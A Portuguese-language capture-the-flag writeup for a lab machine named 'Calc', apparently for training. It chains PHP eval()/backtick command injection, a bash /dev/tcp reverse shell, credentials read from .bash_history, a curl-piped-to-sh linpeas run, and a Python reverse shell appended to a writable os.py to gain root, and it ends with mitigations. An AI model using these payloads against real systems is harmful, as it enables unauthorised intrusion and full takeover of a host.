# 🎯 Writeup — Máquina Calc

> **Dificuldade:** Médio | **SO:** Linux | **Tags:** `Command Injection` · `PHP eval()` · `Backtick Operator` · `Python Library Hijacking` · `Sudo PrivEsc`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado por meio de uma cadeia de exploração que iniciou com uma vulnerabilidade de **Command Injection** em uma calculadora online. A aplicação PHP utilizava a função `eval()` para processar expressões matemáticas, e o suporte nativo do PHP ao operador de execução com backticks (`` ` ``) permitiu a execução arbitrária de comandos no servidor, resultando em **Remote Code Execution (RCE)**. A partir do acesso inicial como `apache`, um arquivo `.bash_history` expôs credenciais em texto plano que possibilitaram a movimentação lateral para o usuário `sysadmin`. A escalação de privilégios foi obtida via **Python Library Hijacking**: o usuário tinha permissão `sudo` para executar um script Python que importava a biblioteca `os`, e essa biblioteca era gravável, permitindo a injeção de uma reverse shell executada com privilégios de `root`.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -p- -T4 --min-rate 1000 <IP_ALVO>
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 22    | SSH     |
| 80    | HTTP (Calculadora PHP) |
| 111   | rpcbind |

### 2.2 Enumeração Web

Acessando a porta 80, foi identificada uma **calculadora online** que permite ao usuário inserir expressões matemáticas e receber o resultado processado pelo servidor.

> ⚠️ A funcionalidade de cálculo server-side é um vetor de injeção potencial — qualquer função que avalie expressões dinamicamente (como `eval()`) pode ser explorada.

---

## 3. Exploração Web — Command Injection via PHP `eval()` + Backticks

### 3.1 Identificação do Ponto de Injeção

Utilizando o **Burp Suite** para interceptar a requisição, foi identificada uma requisição `POST` com o parâmetro `calc` responsável por enviar as expressões ao servidor:

```http
POST / HTTP/1.1
Host: <IP_ALVO>
Content-Type: application/x-www-form-urlencoded

calc=2+2
```

A análise do comportamento indicou o uso da função `eval()` do PHP para processar o parâmetro, tornando-o vulnerável a injeção.

### 3.2 Técnica de Exploração — PHP Backtick Operator

O PHP suporta um **operador de execução com acentos graves (backticks)**, que funciona de forma idêntica à função `shell_exec()`: qualquer conteúdo envolto em `` ` ` `` é executado como comando de shell e seu resultado retornado como string.

**Payload de confirmação (RCE):**

```
`id`
```

O servidor retornou a saída do comando `id`, confirmando a execução remota de comandos:

```
uid=48(apache) gid=48(apache) groups=48(apache)
```

### 3.3 Obtenção de Reverse Shell

Com a confirmação de RCE, o próximo passo foi estabelecer uma reverse shell estável. O payload utilizado:

```bash
/bin/bash -c 'sh -i >& /dev/tcp/<IP_VPN>/443 0>&1'
```

**Importante:** O payload precisa ser URL-encoded antes de ser enviado no parâmetro `calc` via Burp Suite (`Ctrl+U` para encoding automático). Resultado após encoding:

```
/bin/bash+-c+'sh+-i+>%26+/dev/tcp/<IP_VPN>/443+0>%261'
```

Configurando o listener no atacante:

```bash
nc -lvnp 443
```

Após o envio do payload, a conexão reversa foi recebida com o usuário `apache`.

---

## 4. Pós-Exploração — Estabilização do Shell e Flag Inicial

### 4.1 Upgrade para TTY Interativo

```bash
python -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

### 4.2 Flag Web

Navegando até `/var/www/html`, foi obtida a primeira flag da aplicação.

---

## 5. Movimentação Lateral — Apache → sysadmin

### 5.1 Enumeração do Sistema

Como `apache`, ao navegar até o diretório home do usuário `sysadmin`, a flag de usuário estava presente, porém **sem permissão de leitura** para o usuário `apache`.

### 5.2 Leitura do `.bash_history`

```bash
cat /home/sysadmin/.bash_history
```

O arquivo `.bash_history` do usuário `sysadmin` estava legível e continha um **hash (senha)** exposto em texto plano, resultado de um comando previamente executado pelo usuário.

> 🔑 **Credencial descoberta:** `sysadmin` / `<hash/senha encontrada no .bash_history>`
>
> **Falha crítica:** Credencial sensível persistida no histórico de comandos sem remoção.

### 5.3 Acesso SSH como sysadmin

```bash
ssh sysadmin@<IP_ALVO>
# Senha: <hash encontrado>
```

**Flag de Usuário:**

```
uhc{...flag_de_usuario...}
```

---

## 6. Escalação de Privilégios (PrivEsc) — Python Library Hijacking

### 6.1 Enumeração de Sudo

```bash
sudo -l
```

Foi identificado que o usuário `sysadmin` podia executar o script `calc.py` com privilégios de `root`:

```
User sysadmin may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/python /opt/calc.py
```

### 6.2 Análise do Script `calc.py`

O conteúdo do arquivo `/opt/calc.py` foi inspecionado:

```bash
cat /opt/calc.py
```

O script importava a biblioteca padrão `os` do Python — um vetor clássico para **Library Hijacking**.

> ℹ️ O arquivo `calc.py` **não era gravável**, mas a biblioteca importada por ele pode ser.

### 6.3 Identificação da Biblioteca Gravável

Usando o LinPEAS ou enumeração manual para localizar o arquivo `os.py` com permissão de escrita:

```bash
find / -name "os.py" -writable 2>/dev/null
```

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

O `linpeas.sh` confirmou que o arquivo `os.py` da biblioteca padrão do Python era **gravável pelo usuário atual**.

### 6.4 Injeção do Payload na Biblioteca `os.py`

Foi adicionada uma reverse shell na **última linha** do arquivo `os.py`:

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP_VPN>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" >> /usr/lib/python2.7/os.py
```

### 6.5 Gatilho e Exploração

Configurando o listener no atacante:

```bash
nc -lvnp 4444
```

Executando o script com `sudo`:

```bash
sudo /usr/bin/python /opt/calc.py
```

Quando o script importa `os`, o código malicioso injetado é executado com privilégios de `root`, estabelecendo a conexão reversa:

```bash
whoami
# root
```

**Flag de Root:** Obtida em `/root/root.txt`.

---

## 7. Diagrama da Cadeia de Ataque

```
[Calculadora Web - POST /]
        │
        ▼
  Parâmetro calc vulnerável
  (PHP eval() + Backtick Operator)
        │
        └─► RCE como apache
                │
                └─► /home/sysadmin/.bash_history
                        │
                        └─► Credencial exposta (hash/senha)
                                 │
                                 └─► SSH como sysadmin ✅
                                          │
                                          └─► Flag usuário
                                          │
                                          └─► sudo calc.py (root)
                                                   │
                                                   └─► os.py (gravável)
                                                            │
                                                            └─► Library Hijacking → Reverse Shell ROOT ✅
```

---

## 8. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Usuário inicial** | `apache` (via RCE) |
| **Usuário lateral** | `sysadmin` |
| **Senha sysadmin** | `<hash encontrado no .bash_history>` |
| **Flag Usuário** | `uhc{...}` (em `/home/sysadmin/user.txt`) |
| **Flag Root** | (obtida em `/root/root.txt`) |

---

## 9. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CVE/CWE |
|---|-----------------|------------|---------|
| 1 | Command Injection via PHP `eval()` + Backtick Operator | 🔴 Crítico | CWE-78 |
| 2 | Credencial exposta em `.bash_history` | 🔴 Crítico | CWE-312 |
| 3 | Python Library Hijacking via biblioteca `os.py` gravável | 🔴 Crítico | CWE-732 |
| 4 | Configuração insegura de `sudo` (execução de script Python como root) | 🔴 Crítico | CWE-269 |
| 5 | Ausência de validação/sanitização de input no parâmetro `calc` | 🔴 Crítico | CWE-20 |

---

## 10. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas/serviços |
| `Burp Suite` | Interceptação e análise de requisições HTTP |
| `netcat` (`nc`) | Listeners para reverse shells |
| `linpeas.sh` | Enumeração automatizada de PrivEsc |
| `python` | Upgrade de TTY e Library Hijacking |
| `ssh` | Acesso remoto pós-exploração |

---

## 11. Recomendações de Mitigação

1. **Command Injection / `eval()`:** Nunca usar `eval()` com input controlado pelo usuário. Implementar um parser matemático dedicado (ex: biblioteca `mathjs`, `numexpr`) com whitelist estrita de caracteres permitidos.
2. **Backtick Operator:** Desabilitar funções perigosas do PHP via `php.ini`: `disable_functions = exec,shell_exec,passthru,system,popen,proc_open`.
3. **`.bash_history`:** Limpar regularmente o histórico de comandos (`history -c`) e configurar `HISTFILE=/dev/null` em sessões administrativas sensíveis. Nunca digitar senhas diretamente na linha de comando.
4. **Permissões de bibliotecas Python:** Garantir que bibliotecas do sistema sejam de propriedade de `root` e não tenham permissão de escrita para usuários não-privilegiados: `chmod 644 /usr/lib/python*/os.py`.
5. **Configuração de `sudo`:** Restringir ao máximo os scripts executáveis via `sudo`. Evitar que scripts importem módulos de localização relativa ou que módulos importados sejam graváveis. Considerar o uso de `sudoedit` em vez de `sudo` para edição de arquivos.
